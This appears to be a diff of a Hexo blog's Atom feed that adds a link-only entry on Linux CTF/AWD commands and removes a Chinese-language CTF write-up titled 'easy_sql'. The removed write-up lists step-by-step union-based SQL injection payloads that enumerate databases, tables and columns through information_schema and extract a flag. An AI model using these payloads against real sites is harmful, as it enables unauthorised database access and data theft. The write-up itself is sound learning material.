@@ -6,7 +6,7 @@
   <link href="http://cxdshibaba.github.io/atom.xml" rel="self"/>
   
   <link href="http://cxdshibaba.github.io/"/>
-  <updated>2022-06-02T14:36:00.549Z</updated>
+  <updated>2022-07-07T07:43:48.173Z</updated>
   <id>http://cxdshibaba.github.io/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>LINUX常用命令</title>
+    <link href="http://cxdshibaba.github.io/2022/07/07/LINUX%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
+    <id>http://cxdshibaba.github.io/2022/07/07/LINUX%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
+    <published>2022-07-07T07:42:32.000Z</published>
+    <updated>2022-07-07T07:43:48.173Z</updated>
+    
+    <content type="html"><![CDATA[<p> Windows&amp;Linux打CTF/AWD常用命令_1stPeak的博客-CSDN博客_ctf exe文件](<a href="https://blog.csdn.net/qq_41617034/article/details/115583211">https://blog.csdn.net/qq_41617034/article/details/115583211</a>)</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt; Windows&amp;amp;Linux打CTF/AWD常用命令_1stPeak的博客-CSDN博客_ctf exe文件](&lt;a href=&quot;https://blog.csdn.net/qq_41617034/article/details/115583211&quot;&gt;https:/</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>ISCC MISC套中套</title>
@@ -398,26 +418,6 @@ class chybeta{undefined
       
       
     <summary type="html">&lt;p&gt;首先输入?id=1测试，未发现漏洞，接着输入?=1’，报错，说明存在注入点&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/11/3629592a82d2adf7.png&quot;&gt;&lt;br&gt;接着使用orde by查询可知有三列&lt;br&gt;&lt;img sr</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>题目easy_sql</title>
-    <link href="http://cxdshibaba.github.io/2021/11/11/%E9%A2%98%E7%9B%AEeasy-sql/"/>
-    <id>http://cxdshibaba.github.io/2021/11/11/%E9%A2%98%E7%9B%AEeasy-sql/</id>
-    <published>2021-11-11T11:56:09.000Z</published>
-    <updated>2021-11-11T12:23:32.224Z</updated>
-    
-    <content type="html"><![CDATA[<p>培训的题目，感觉有点懵，想了好久……..<br>首先看到页面参数为wllm<br>先尝试输入？wllm=1<br><img src="https://i.bmp.ovh/imgs/2021/11/b18c89c31a27ed32.png"><br>接着尝试？wllm=1’<br><img src="https://i.bmp.ovh/imgs/2021/11/f9eafa4bdf0aa2a9.png"><br>说明存在sql出入漏洞，接着用order by判断有几行<br><img src="https://i.bmp.ovh/imgs/2021/11/ad1731300884dfca.png"><br>判断有3行，接着先查询所有数据库，输入?wllm=-1’ union select 1,2,database()–+<br><img src="https://i.bmp.ovh/imgs/2021/11/178dde1cc45bbe2a.png"><br>接着查询test_db表，输入?wllm=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’test_db’–+<br><img src="https://i.bmp.ovh/imgs/2021/11/a36e17a705d6ca28.png"><br>接着查test_tb字段，输入?wllm=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’test_tb’–+<br><img src="https://i.bmp.ovh/imgs/2021/11/b837ab4a84da968d.png"><br>最后取出flag，输入?wllm=-1’ union select 1,2,flag from test_tb–+<br><img src="https://i.bmp.ovh/imgs/2021/11/d329211248661b07.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;培训的题目，感觉有点懵，想了好久……..&lt;br&gt;首先看到页面参数为wllm&lt;br&gt;先尝试输入？wllm=1&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/11/b18c89c31a27ed32.png&quot;&gt;&lt;br&gt;接着尝试？wllm=1’&lt;</summary>
       
     
     
